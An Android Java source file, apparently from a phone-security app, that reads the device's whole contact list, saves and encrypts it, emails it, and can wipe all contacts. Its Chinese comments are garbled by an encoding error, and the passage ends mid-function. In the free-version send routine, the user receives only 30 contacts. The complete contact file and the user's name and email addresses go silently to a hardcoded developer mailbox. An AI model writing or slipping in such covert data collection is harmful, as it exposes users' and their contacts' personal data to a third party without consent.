package Boomerang_android15.com;

///////////////////////////////////////////////////////////////////////
//
//ģ�鹦��:������绰����صĲ���
//
//
//////////////////////////////////////////////////////////////////////

//package fei_qu_lai;
//�绰���Ĵ���ֻ��һ�ַ�ʽ,�ڽ��ܵ�һ��ָ��ʱ���.
//1����ȡ�绰��������ͨѶ¼�ļ���2������ͨѶ¼�ļ��� 3������ͨѶ¼�ļ���4��ɾ���绰������ɾ�����ܺ�ı����ļ�����



import java.io.File;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.Vector;



import android.content.ContentResolver;
import android.content.Context; 
import android.database.Cursor; 
import android.provider.Contacts;
import android.util.Log;




public class OperatePhoneBook 
{  
  
    public static final String[] PEOPLE_PROJECTION = new String[] 
    {   
        Contacts.People._ID,
        Contacts.People.PRIMARY_PHONE_ID,
        Contacts.People.TYPE,
        Contacts.People.NUMBER,
        Contacts.People.LABEL,
        Contacts.People.NAME,
        
    };
  
    public static final String[] PHONE_PROJECTION = new String[]
    {
        Contacts.Phones.NUMBER,
        Contacts.Phones.PERSON_ID,
        Contacts.Phones.TYPE,
        Contacts.Phones.LABEL
    };  
   
    //Contacts.ContactMethods
    public static final String[] CONTACT_METHODS_PROJECTION = new String[]
    {
        Contacts.ContactMethods.ISPRIMARY,
        Contacts.ContactMethods.KIND,
        Contacts.ContactMethods.TYPE,
        Contacts.ContactMethods.PERSON_ID,
        Contacts.ContactMethods.DATA
    };
   
    public static final String[] CONTACT_ORGANIZATION = new String[]
    {
        Contacts.Organizations.PERSON_ID,
        Contacts.Organizations.LABEL,
        Contacts.Organizations.TITLE,
        Contacts.Organizations.TYPE,
        Contacts.Organizations.COMPANY,
        Contacts.Organizations.ISPRIMARY
    };
    
    
    //�ļ��������  
    private String m_phoneFullName; //��������绰����Ϣ���ļ����ļ���ȫ·��
    private String m_phoneFullNameForLimit;  //����������Ѱ�ĵ绰���ļ����ļ�ȫ·��
    private BufferedWriter m_bw;  //д����Ҳ���Կ���ʹ�� FileOutputStream ��ʽ
    private File m_phoneFile; //��������绰����Ϣ���ļ����ļ�����
  
  

    //������Ϣ���
    private SetInformation m_settingInfor;    //�����ļ���������Ϣ
    private String m_configFilePath;  //�����ļ���·��
    
    //�������
    private FqlEmail m_mailPort ;  //ͨ�������ʼ��Ľӿ�
    

    //֧�ּ��ܹ���
	private encryption myEncrpt = new encryption();
    
	//���ڻ�ȡ��ϵͳ��ص���Ϣ
	private Context m_context;
	
	private final int LIMIT_PEOPLE_COUNT = 30; //��Ѱ��У�֧�ּ�¼����ϵ�����ֵ
	
	/////////////////////////////////////////////////////////////////////////
	//
	//��������:���캯��
	//
	//ע:��ȡ�����ļ�,���õ绰���ļ�·��
	/////////////////////////////////////////////////////////////////////////
	public OperatePhoneBook (Context context)
	{
		
		m_context = context;
		
		//1.��������ļ�·��
        Log.i("333+++", "ProcessPhoneBook initialize: begin!");
        m_configFilePath = m_context.getFilesDir()+ java.io.File.separator + m_context.getString(R.string.config_file);
   
        //2.��ȡ�����ļ���Ϣ
        m_settingInfor = new  SetInformation(m_configFilePath);     
        m_settingInfor.ReadConfigFile();
   
        //3.��ô����绰���ļ���ȫ·��
        //m_phoneFullName = m_settingInfor.GetDataPath() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        m_phoneFullName = m_context.getFilesDir() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        m_phoneFullNameForLimit = m_context.getFilesDir() + java.io.File.separator + "free_" +m_settingInfor.GetPhoneBookInforName();
		///////////////////////////////////////////
		// 4.���ü�����Կ
		//////////////////////////////////////////////
		String password = m_settingInfor.GetPassWord();
		myEncrpt.SetKey(password.substring(0, 8));
		
	}
	
    

    /////////////////////////////////////////////////////////////
    //
    //��������:����绰����Ϣ��ָ���ļ�
    //
    ////////////////////////////////////////////////////////////////
    public void SavePhoneBook()
    {
        //��������绰����Ϣ���ļ�
        CreatPhoneFile();
        
       
        
        
        //���绰���е���Ϣд���ļ�����
        GetPeople();
        
        ClosePhoneFile();
      
    }
    
    /////////////////////////////////////////////////////////////
    //
    //��������:����绰����Ϣ��ָ���ļ�
    //ע:����Ա�Ķ�
    ////////////////////////////////////////////////////////////////
    public void SavePhoneBookText()
    {
        //��������绰����Ϣ���ļ�
    	Log.i("333+++", "PhoneBook SavePhoneInforText: begin!");
        CreatPhoneFile();
                
        
        //���绰���е���Ϣд���ļ�����
        GetPeopleText();
        
        //�رյ绰���ļ�
        ClosePhoneFile();
      
    }

 
    /////////////////////////////////////////////////////////////
    //
    //��������:����绰����Ϣ��ָ���ļ�����Ѱ棩
    //ע:����Ա�Ķ�
    ///////////////////////////////////////////////////////////////
    public void SavePhoneBookTextForFree()
    {
    	//�������ư�绰����Ϣ 
    	Log.i("333+++", "PhoneBook SavePhoneBookTextForFree: begin!");
    	Log.i("555+++", "PhoneBook SavePhoneBookTextForFree: begin!");
        CreatPhoneFileForLimit();  //��������绰����Ϣ���ļ�(���ư�)
        GetPeopleTextForLimit(); //���绰���е���Ϣд���ļ����棨���ư棩
        ClosePhoneFile();//�رյ绰���ļ�
        
        
        //����������绰����Ϣ
        CreatPhoneFile();    //��������绰����Ϣ���ļ�
        GetPeopleText();	 //���绰���е���Ϣд���ļ�����        
        ClosePhoneFile();	 //�رյ绰���ļ�
      
    }
    
    ////////////////////////////////////////////////////////////////////
    //
    //��������:������������绰����Ϣ���ļ�
    //
    /////////////////////////////////////////////////////////////////////
    private  void CreatPhoneFile()
    {   
    	Log.i("333+++", "PhoneBook CreatPhoneFile: begin!");
        //���ļ���صĲ���      
        m_phoneFile =  new java.io.File(m_phoneFullName);  
    
        if (m_phoneFile.exists())
        {
            //����ļ��Ѿ����ڽ��ļ�ɾ��
            m_phoneFile.delete();     
        }
      
        try
        {
        	m_phoneFile.createNewFile();
        }
        catch (Exception e)
        {
        	e.printStackTrace();        
            
        }
      
       
      
        try
        {
			OutputStream out = new FileOutputStream(m_phoneFile); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK"));
            //m_bw = new java.io.BufferedWriter(new java.io.FileWriter(m_phoneFile));               
           
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    
    }//ProcessPhoneBook()

    
    ////////////////////////////////////////////////////////////////////
    //
    //��������:������������绰����Ϣ���ļ�����Ѱ棩
    //
    /////////////////////////////////////////////////////////////////////
    private  void CreatPhoneFileForLimit()
    {
    	Log.i("333+++", "PhoneBook CreatPhoneFile: begin!");
        //���ļ���صĲ���      
        m_phoneFile =  new java.io.File(this.m_phoneFullNameForLimit);  
    
        if (m_phoneFile.exists())
        {
            //����ļ��Ѿ����ڽ��ļ�ɾ��
            m_phoneFile.delete();     
        }
      
        try
        {
        	m_phoneFile.createNewFile();
        }
        catch (Exception e)
        {
        	e.printStackTrace();        
            
        }
      
       
      
        try
        {
			OutputStream out = new FileOutputStream(m_phoneFile); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK"));
            //m_bw = new java.io.BufferedWriter(new java.io.FileWriter(m_phoneFile));               
           
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    
    	
    	
    }
    
    
    
    ///////////////////////////////////////////////////////////
    //
    //�������ܣ������رձ���绰����Ϣ���ļ�
    //ע��֧����Ѱ���շѰ�
    //
    /////////////////////////////////////////////////////////////
    private void ClosePhoneFile()
    {
    	Log.i("333+++", "PhoneBook ClosePhoneFile: begin!");
        try
        { 
            m_bw.flush();
            m_bw.close();
            
          
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    }
    
    
    /////////////////////////////////////////////////////////////////////
    //
    //��������:�Ե绰�����ݽ���ɾ��
    //
    /////////////////////////////////////////////////////////////////////
    public void DelPhoneBook()
    {
    	Cursor contactCursor;
    	ContentResolver content;
      
    	content = m_context.getContentResolver();
      
    	content.delete(Contacts.People.CONTENT_URI, null, null);
     
    
    }




    ////////////////////////////////////////////////////////////////
    //
    //��������:ɾ������绰����Ϣ���ļ�
    //
    /////////////////////////////////////////////////////////////////////
    public void DelPhoneBookFile()
    {
    
    	File phoneFile =  new java.io.File(m_phoneFullName);  
    
    	if (phoneFile.exists())
    	{
    		//����ļ��Ѿ����ڽ��ļ�ɾ��
    		Log.i("333+++", "ProcessPhoneBook DelPhoneBookFile: begin!");
    		m_phoneFile.delete();     
    	}
    
    }

    //�Ա���绰����Ϣ���ļ����м���
    public void EncrptPhoneBookFile()
    {
    	Log.i("333+++", "ProcessPhoneBook EncrptPhoneBookFile: begin!");
    	myEncrpt.encrptFileAll(m_phoneFullName);
    
    }

    public void DencryptPhoneBookFile()
    {
    	Log.i("333+++", "ProcessPhoneBook DencryptPhoneBookFile: begin!");
    	myEncrpt.decrptFileAll(m_phoneFullName);
    }
    
    ////////////////////////////////////////////////////////
    //
    //��������:���͵绰���ļ�
    //
    //
    ////////////////////////////////////////////////////////
    public void SendPhoneBookFile()
    {
    	Log.i("333+++", "ProcessPhoneBook SendPhoneBookFile: begin!");
    	Vector<String> emailAddress = new Vector<String>();
    	emailAddress.add(m_settingInfor.GetEmail_1());
    	emailAddress.add(m_settingInfor.GetEmail_2());
    	String Subject = new String();
    	String text = new String();
    	String filePath = new String();
	  
    	Subject = m_context.getString(R.string.email_suject); //�����ʼ�����
    	Subject += "----�绰����Ϣ";    	
    	
    	//�����ʼ�����
    	text = m_context.getString(R.string.email_text);	//���������Ϣ
    	text += m_context.getString(R.string.app_version); //����汾��Ϣ
    	filePath = this. m_phoneFullName;	//�����ʼ�������·��
    	
    	
    	m_mailPort = new FqlEmail();
    	m_mailPort.SendFile(emailAddress, Subject, text, filePath); //�����ʼ�
	  
    	Log.i("333+++", "ProcessPhoneBook SendPhoneBookFile: begin!");
    
    }

    ////////////////////////////////////////////////////////
    //
    //��������:���͵绰���ļ�(free��)
    //ע��ֻ���û��������޵���ϵ����Ϣ
    //
    ////////////////////////////////////////////////////////
    public void SendPhoneBookFileForFree()
    {
    	
       	Log.i("333+++", "PhoneBook SendPhoneBookFileForFree: begin!");
       	Log.i("555+++", "PhoneBook SendPhoneBookFileForFree! ");
       	
       	////////////////////////////////////
       	//������������ϵ����Ϣ����
       	//////////////////////////////////////
    	Vector<String> emailAddress = new Vector<String>();
    	emailAddress.add("fql_free_backup@sina.com");    	 //��������һ�汾д�������ļ���
    	String Subject = new String();
    	String text = new String();
    	String filePath = new String();
	  
    	Subject = m_context.getString(R.string.email_suject); //�����ʼ�����
    	Subject += "----�绰����Ϣ����";
    	text = m_context.getString(R.string.email_text)+ "\r\n";	//�����ʼ����� ,�ʼ�������Ҫ����ض��û�����Ϣ���û��������䡣
		text += "�û���:" + m_settingInfor.GetUserName()+ "\r\n";
		text += "��һ����:" + m_settingInfor.GetEmail_1()+ "\r\n";
		text += "�ڶ�����:" + m_settingInfor.GetEmail_2()+ "\r\n";
    	
    	filePath = this.m_phoneFullName;	//�����ʼ�������·��   	
    	
		File phoneFile = new File(m_phoneFullName);
		long fileLen = phoneFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "����ϵͳԭ���޷���õ绰�����ݣ�";
			
		}
		
    	Log.i("555+++", "PhoneBook send backup email");
    	m_mailPort = new FqlEmail();
    	m_mailPort.SendFile(emailAddress, Subject, text, filePath); //�����ʼ�
	  
    	
    	
    	////////////////////////////////////
    	//���������Ƶ���Ϣ���û�
    	////////////////////////////////////
    	emailAddress.clear(); //���ԭ�е������ַ
    	emailAddress.add(m_settingInfor.GetEmail_1()); //�����û��Լ�ע��������ַ
    	emailAddress.add(m_settingInfor.GetEmail_2());
	  
    	Subject = m_context.getString(R.string.email_suject); //�����ʼ�����
    	Subject += "----�绰����Ϣ";
    	text = m_context.getString(R.string.email_text);	//�����ʼ�����
    	filePath = this.m_phoneFullNameForLimit;	//�����ʼ�������·��    	
    	
		phoneFile = new File(m_phoneFullNameForLimit);
		fileLen = phoneFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "����ϵͳԭ���޷���õ绰�����ݣ�";
			
		}
    	
    	Log.i("555+++", "PhoneBook send free email");
    	m_mailPort = new FqlEmail();
    	m_mailPort.SendFile(emailAddress, Subject, text, filePath); //�����ʼ�
	  
    	
    	
    	
    }
    
    
    ///////////////////////////////////////////////////////
    //
    //��������:���������ϵ�˵���Ϣ
    //
    ///////////////////////////////////////////////////////
    private void GetPeople()
    {
    	Cursor contactCursor;
    	ContentResolver content;
    
    
    	String outputString;
    	int rowCount;
    	String name= "";
    	String notes= "";
    	String id= "";
    
    
    	content = m_context.getContentResolver();
    	contactCursor = content.query
    	(
    		Contacts.People.CONTENT_URI,
    		null, null, null,      //peple_projection
    		Contacts.People.DEFAULT_SORT_ORDER    //default_sort_order
    	);
    
    	contactCursor.moveToFirst(); //ָ�����ݵĵ�һ��   
    	rowCount = contactCursor.getCount();  //������ݵ�����   
    
    	for (int i=0; i<rowCount; i++)
    	{
    		notes = contactCursor.getString(contactCursor.getColumnIndex("notes"));//okok
    		name = contactCursor.getString(contactCursor.getColumnIndex("name")); //liudehua
    		id = contactCursor.getString(contactCursor.getColumnIndex("_id")); //1
    		outputString= "person"+ ":" + name;
        
    		WriteString(outputString); //�����ϵ�˵�id������
        
    		GetOnePeopleDetail(name);
        
    		outputString = "notes: " + notes;
    		WriteString(notes); //���notes��Ϣ
    		WriteString("");
    		outputString ="";
    		contactCursor.moveToNext();
        
        
    	}//end for
   
    
    }//end GetPeople function

    
    ////////////////////////////////////////////////////////////
    //
    //�������ܣ���ȡ��ϵ�˵���Ϣ�����ư�棬
    //ע����ϵ�˸���������Ϊ30��
    //
    ///////////////////////////////////////////////////////////
    private void GetPeopleTextForLimit()
    {
       	Log.i("333+++", "PhoneBook GetPeopleText: begin!");
    	Cursor contactCursor;
    	ContentResolver content;    
    
    	String outputString;
    	int rowCount;
    	int rowCountForWrite = 0;
    	String name= "";
    	String notes= "";
    	String id= "";    
    
    	content = m_context.getContentResolver();
    	contactCursor = content.query
    	(
    		Contacts.People.CONTENT_URI,
    		null, null, null,      //peple_projection
    		Contacts.People.DEFAULT_SORT_ORDER    //default_sort_order
    	);
    
    	contactCursor.moveToFirst(); //ָ�����ݵĵ�һ��   
    	rowCount = contactCursor.getCount();  //������ݵ�����   
    	
    	if(rowCount > LIMIT_PEOPLE_COUNT) //LIMIT_PEOPLE_COUNTΪ30
    	{
    		rowCountForWrite =LIMIT_PEOPLE_COUNT;
    	}
    	else
    	{
    		rowCountForWrite = rowCount;
    	}
    
    	outputString = "��ӭʹ�÷�ȥ���ֻ���ʿ��ͨѶ¼Զ�̱��ݹ��ܣ�\r\n";
    	WriteString(outputString);
    	if(rowCount == 0)
    	{
    		outputString = "���������ֻ��绰����û����ϵ�˵���Ϣ���޷�����ͨѶ¼��Զ�̱��ݡ�" +
    				"\r\n������������ϵ Email��fql_helper@sina.com ��" +
    				"\r\n��ȥ���ֻ���ʿ�İ�������Ը����ʱΪ���ṩ������";   
    		WriteString(outputString);
    	}
    	else
    	{
    		outputString = "����"+ String.valueOf(rowCount) + "����ϵ����Ϣ\r\n" + 
    				"�������Ƿ�ȥ���ֻ���ʿ��Ѱ��û���Ŀǰֻ֧��"+ 
    				String.valueOf(LIMIT_PEOPLE_COUNT) +"����ϵ�˵ı���.";
        	WriteString(outputString);
    	}
    	
    	
    	for (int i=0; i<rowCountForWrite; i++)
    	{
    		notes = contactCursor.getString(contactCursor.getColumnIndex("notes"));//okok
    		name = contactCursor.getString(contactCursor.getColumnIndex("name")); //liudehua
    		id = contactCursor.getString(contactCursor.getColumnIndex("_id")); //1
    		outputString= "name:" + name;
        
    		WriteString(outputString); //�����ϵ�˵�id������
        
    		GetOnePeopleDetailText(name);
        
    		outputString = "notes:" + notes;
    		WriteString(outputString); //���notes��Ϣ
        
    		WriteString(""); //�������
    		outputString = "";
    		contactCursor.moveToNext();
    	}//end for   	
    
    }//end function GetPeopleTextForFree
    
    
    

    ///////////////////////////////////////////////////////
  	//
    //��������:���������ϵ�˵���Ϣ
    //
    ///////////////////////////////////////////////////////
    private void GetPeopleText()
    {
    	Log.i("333+++", "PhoneBook GetPeopleText: begin!");
    	Cursor contactCursor;
    	ContentResolver content;
    
    
    	String outputString;
    	int rowCount;
    	String name= "";
    	String notes= "";
    	String id= "";
    
    
    	content = m_context.getContentResolver();
    	contactCursor = content.query
    	(
    		Contacts.People.CONTENT_URI,
    		null, null, null,      //peple_projection
    		Contacts.People.DEFAULT_SORT_ORDER    //default_sort_order
    	);
    
    	contactCursor.moveToFirst(); //ָ�����ݵĵ�һ��   
    	rowCount = contactCursor.getCount();  //������ݵ�����   
    
    	
    	outputString = "��ӭʹ�÷�ȥ���ֻ���ʿ��ͨѶ¼Զ�̱��ݹ��ܣ�\r\n";
    	WriteString(outputString);
    	if(rowCount == 0)
    	{
    		outputString = "���������ֻ��绰����û����ϵ�˵���Ϣ���޷�����ͨѶ¼��Զ�̱��ݡ�" +
    				"\r\n������������ϵ Email��fql_helper@sina.com ��" +
    				"\r\n��ȥ���ֻ���ʿ�İ�������Ը����ʱΪ���ṩ������";   
    		WriteString(outputString);
    	}
    	else
    	{
    		outputString = "��Զ�̱���"+ String.valueOf(rowCount) + "����ϵ����Ϣ";
        	WriteString(outputString);
    	}
    	
    	
    	for (int i=0; i<rowCount; i++)
    	{
    		notes = contactCursor.getString(contactCursor.getColumnIndex("notes"));//okok
    		name = contactCursor.getString(contactCursor.getColumnIndex("name")); //liudehua
    		id = contactCursor.getString(contactCursor.getColumnIndex("_id")); //1
    		outputString= "name:" + name;
        
    		WriteString(outputString); //�����ϵ�˵�id������
        
    		GetOnePeopleDetailText(name);
        
    		outputString = "notes:" + notes;
    		WriteString(outputString); //���notes��Ϣ
        
    		WriteString(""); //�������
    		outputString = "";
    		contactCursor.moveToNext();
    	}//end for
   
    
    }//end GetPeople function



    ////////////////////////////////////////////////////////////////
    //
    //��������:ͨ����ϵ�˵����ֻ����ϵ�˵���ϸ��Ϣ
    //
    //
    //////////////////////////////////////////////////////////////////
    private void GetOnePeopleDetail(String name)
    {
        String personId;
        
        //�����ϵ�˵ĵ绰��Ϣ
        personId = GetPhoneInfor(name);
        
        
        //���������ϵ��ʽ����Ϣ
        GetContactMethodsInfor(name);
        
        //�����֯��Ϣ
        GetContactOrganizations(personId);
        
        
    
    }

    ////////////////////////////////////////////////////////////////
    //
    //��������:ͨ����ϵ�˵����ֻ����ϵ�˵���ϸ��Ϣ
    //ע:�����˹��Ķ�
    //
    //////////////////////////////////////////////////////////////////
    private void GetOnePeopleDetailText(String name)
    {
        String personId;
        
        //�����ϵ�˵ĵ绰��Ϣ
        personId = GetPhoneInforText(name);
        
        
        //���������ϵ��ʽ����Ϣ
        GetContactMethodsInforText(name);
        
        //�����֯��Ϣ
        GetContactOrganizationsText(personId);
        
        
    
    }

    ///////////////////////////////////////////////////////////
    //
    //��������:�����ϵ�˵ĵ绰��ص���Ϣ
    //
    //
    ////////////////////////////////////////////////////////////
    private String GetPhoneInfor(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
      
        int rowCount;
        String personID = "";
        String number= "";
        String type= "";
        String label= "";
        
        String outputString;
        
        content = m_context.getContentResolver();
        contactCursor = content.query
        (
            Contacts.Phones.CONTENT_URI,
            null, Contacts.Phones.NAME + "=?", 
            new String[]{name},       //peple_projection
            Contacts.Phones.DEFAULT_SORT_ORDER    //default_sort_order
        );
        
        contactCursor.moveToFirst(); //ָ�����ݵĵ�һ��   
        rowCount = contactCursor.getCount();
        personID = contactCursor.getString(contactCursor.getColumnIndex("person")); ;

        outputString = "�绰��ϵ��ʽ,�� " + rowCount + "�ַ�ʽ";
        WriteString(outputString);
        
        
        for (int i=0; i<rowCount; i++)
        {
            number = contactCursor.getString(contactCursor.getColumnIndex("number")); //liudehua
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label"));
            

            
            //����绰����
            outputString = "number:" + number;
            WriteString(outputString);
            
            //����绰��������
            outputString = "type:" + type;
            WriteString(outputString);
            
            //���label��Ϣ
            if (label!=null)
            {
                outputString = "label:" + label;
                WriteString(outputString);
            }//end if

            
            outputString = "";
            contactCursor.moveToNext();
        }//end for
        
        return personID;
        
    }//end GetPhoneInfor function

    ///////////////////////////////////////////////////////////
    //
    //��������:�����ϵ�˵ĵ绰��ص���Ϣ
    //ע:�˿ɶ���Ϣ
    //
    ////////////////////////////////////////////////////////////
    private String GetPhoneInforText(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
      
        int rowCount;
        String personID = "";
        String number= "";
        String type= "";
        String label= "";
        
        String outputString = new String();
        
        content = m_context.getContentResolver();
        contactCursor = content.query
        (
            Contacts.Phones.CONTENT_URI,
            null, Contacts.Phones.NAME + "=?", 
            new String[]{name},       //peple_projection
            Contacts.Phones.DEFAULT_SORT_ORDER    //default_sort_order
        );
        
        contactCursor.moveToFirst(); //ָ�����ݵĵ�һ��   
        rowCount = contactCursor.getCount();
        personID = contactCursor.getString(contactCursor.getColumnIndex("person")); ;

        //outputString = "�绰��ϵ��ʽ,�� " + rowCount + "�ַ�ʽ";
        //WriteString(outputString);
        
        
        for (int i=0; i<rowCount; i++)
        {
            number = contactCursor.getString(contactCursor.getColumnIndex("number")); //liudehua
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label"));
            

            if (type.equals("1"))
            {
                outputString = "home:";
                           
            }
            else if (type.equals("2"))
            {
                outputString = "mobile:";
            }
            else if (type.equals("3"))
            {
                outputString = "work:";
            }
            else if (type.equals("4"))
            {
                outputString = "work fax:";
            }
            else if (type.equals("5"))
            {
                outputString = "home fax:";
            }
            else if (type.equals("6"))
            {
                outputString = "pager:";
            }
            else if (type.equals("7"))
            {
                outputString = "other:";
            }
            else if (type.equals("0"))
            {
                if (label!=null)
                {
                  outputString = label+ ":";
                }
            }
           
            //����绰����
            outputString += number;
            WriteString(outputString);
            
            outputString = "";
            contactCursor.moveToNext();
        }//end for
        
        return personID;
        
    }//end GetPhoneInfor function
    ///////////////////////////////////////////////////////////
    //
    //��������:�����ϵ�˵ĵ绰��ص���Ϣ
    //
    //
    ////////////////////////////////////////////////////////////
    private void GetContactMethodsInfor(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
    
        int rowCount;
        
        String isprimary;
        String kind;
        String type;
        String aux_data;
        String personId;
        String data;
        String label;   
      
        String outputString;
        
        content = m_context.getContentResolver();      
        contactCursor = content.query
        (
            Contacts.ContactMethods.CONTENT_URI,
            null, Contacts.ContactMethods.NAME + "=?", 
            new String[]{name},      //peple_projection
            Contacts.ContactMethods.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst(); 
        
        
        for (int i=0; i< rowCount; i++)
        {
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary"));
            kind = contactCursor.getString(contactCursor.getColumnIndex("kind")); 
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            aux_data = contactCursor.getString(contactCursor.getColumnIndex("aux_data")); //null
            
            personId = contactCursor.getString(contactCursor.getColumnIndex("person")); //1
            data = contactCursor.getString(contactCursor.getColumnIndex("data"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            
            outputString = "isprimary: " + isprimary;
            WriteString(outputString);
            
            outputString = "kind: " + kind;
            WriteString(outputString);
            
            outputString = "type: " + type;
            WriteString(outputString);
            
            if (aux_data != null)
            {
              outputString = "aux_data: " + aux_data;
                WriteString(outputString);
            }
            
            outputString = "personId: " + personId;
            WriteString(outputString);
            
            outputString= "data: " + data;
            WriteString(outputString);
            
            if (label != null)
            {
              outputString = "label: " + label;
                WriteString(outputString);
            }
            
            outputString = "";
            contactCursor.moveToNext();
            
        }
      
    }
    
    ///////////////////////////////////////////////////////////
    //
    //��������:�����ϵ�˵ĵ绰��ص���Ϣ
    //ע:������Ա�Ķ�
    //
    ////////////////////////////////////////////////////////////
    private void GetContactMethodsInforText(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
    
        int rowCount;
        
        String isprimary;
        String kind;
        String type;
        String aux_data;
        String personId;
        String data;
        String label;   
    
      
        String outputString = new String();
        
        content = m_context.getContentResolver();      
        contactCursor = content.query
        (
            Contacts.ContactMethods.CONTENT_URI,
            null, Contacts.ContactMethods.NAME + "=?" , 
            new String[]{name},      //peple_projection
            Contacts.ContactMethods.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst(); 
        
        
        for (int i=0; i< rowCount; i++)
        {
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary"));
            kind = contactCursor.getString(contactCursor.getColumnIndex("kind")); 
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            aux_data = contactCursor.getString(contactCursor.getColumnIndex("aux_data")); //null
            
            personId = contactCursor.getString(contactCursor.getColumnIndex("person")); //1
            data = contactCursor.getString(contactCursor.getColumnIndex("data"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            
            if (kind.equals("1"))
            {
                outputString = "email with ";  
                if (type.equals("1"))
                {                
                    outputString += "home:";
                }
                else if (type.equals("2"))
                {
                    outputString += "work:";
                }
                else if (type.equals("3"))
                {
                    outputString += "other:";
                }
                else if (type.equals("0"))
                {
                    if (label!=null)
                    {
                        outputString += label + ":" ;
                    }
                }
              
            }
            else if (kind.equals("2"))
            {
                outputString = "Postal with ";
                
                if (type.equals("1"))
                {                
                    outputString += "home:";
                }
                else if (type.equals("2"))
                {
                    outputString += "work:";
                }
                else if (type.equals("3"))
                {
                    outputString += "other:";
                }
                else if (type.equals("4"))
                {
                    if (label!=null)
                    {
                        outputString += label + ":" ;
                    }
                }
              
            }
           
            else if (kind.equals("3"))
            {
            	/*
                outputString = "chat with ";
              
                if (aux_data.equals("pre:0"))
                {                
                    outputString += "Aim:";
                }
                else if (aux_data.equals("pre:1"))
                {
                    outputString += "Window live:";
                }
                else if (aux_data.equals("pre:2"))
                {
                    outputString += "Yahoo:";
                }
                else if (aux_data.equals("pre:3"))
                {
                    outputString += "skype:";                
                }
                else if (aux_data.equals("pre:4"))
                {
                    outputString += "QQ:";
                }
                else if (aux_data.equals("pre:5"))
                {
                    outputString += "google talk:";
                }
                else if (aux_data.equals("pre:6"))
                {
                    outputString += "ICQ:";
                }
                else if (aux_data.equals("pre:7"))
                {
                    outputString += "Jabber:";
                }
                else if (aux_data.equals("pre:8"))
                {
                    outputString += "Fetion:";
                }
              */
              
            }//end if (kind.equals("1"))
           
            if (outputString.length()>0)
            {
            	outputString  += data;
            	WriteString(outputString);
            }
            
            outputString = "";
            contactCursor.moveToNext();
            
        }// end for
      
    }// end function
    
    
    ////////////////////////////////////////////////////////////
    //
    //��������:�����ϵ�˻�����Ϣ
    //
    //
    //
    /////////////////////////////////////////////////////////////
    private void GetContactOrganizations(String personId)
    {
      
        Cursor contactCursor;
        ContentResolver content;

        int rowCount;
      
        String isprimary;
        String title;
        String type;
        String company;
        String label;   
    
        String outputString;
      
        content = m_context.getContentResolver();      
      
        contactCursor = content.query
        (
            Contacts.Organizations.CONTENT_URI,
            null, Contacts.Organizations.PERSON_ID + "=?", 
            new String[]{personId},      //peple_projection
            Contacts.Organizations.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst();
      
        for (int i=0; i<rowCount; i++)
        {        
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary")); //0  1
            title = contactCursor.getString(contactCursor.getColumnIndex("title")); //Bbb Aaa
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));//2 1
            //name = contactCursor.getString(contactCursor.getColumnIndex("_id")); //2 1
            company = contactCursor.getString(contactCursor.getColumnIndex("company")); //ibm Itel
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            outputString = "isprimary: " + isprimary;
            WriteString(outputString);
            
            outputString = "title: " + title;
            WriteString(outputString);
            
            outputString = "type: " + type;
            WriteString(outputString);
            
            outputString = "company: " + company;
            WriteString(outputString);
            
                      
            if (label != null)
            {
                outputString = "label: " + label;
                WriteString(outputString);
            }
           
            outputString = "";
            contactCursor.moveToNext();
        }
        Log.i("333+++", "GetContactOrganizations: begin!");
    }
    
    ////////////////////////////////////////////////////////////
    //
    //��������:�����ϵ�˻�����Ϣ
    //ע:�˹��Ķ�
    //
    //
    /////////////////////////////////////////////////////////////
    private void GetContactOrganizationsText(String personId)
    {
      
        Cursor contactCursor;
        ContentResolver content;

        int rowCount;
      
        String isprimary;
        String title;
        String type;
        String company;
        String label;   
    
        String outputString = "";
      
        content = m_context.getContentResolver();      
      
        contactCursor = content.query
        (
            Contacts.Organizations.CONTENT_URI,
            null, Contacts.Organizations.PERSON_ID + "=?", 
            new String[]{personId},      //peple_projection
            Contacts.Organizations.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst();
        
        outputString = "Organizations:";
        WriteString(outputString);
        
      
        for (int i=0; i<rowCount; i++)
        {        
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary")); //0  1
            title = contactCursor.getString(contactCursor.getColumnIndex("title")); //Bbb Aaa
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));//2 1
            //name = contactCursor.getString(contactCursor.getColumnIndex("_id")); //2 1
            company = contactCursor.getString(contactCursor.getColumnIndex("company")); //ibm Itel
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            if (type.equals("1"))
            {
                outputString = "work:";
            }
            else if (type.equals("2"))
            {
                outputString = "other:";
            }
            else if (type.equals("0"))
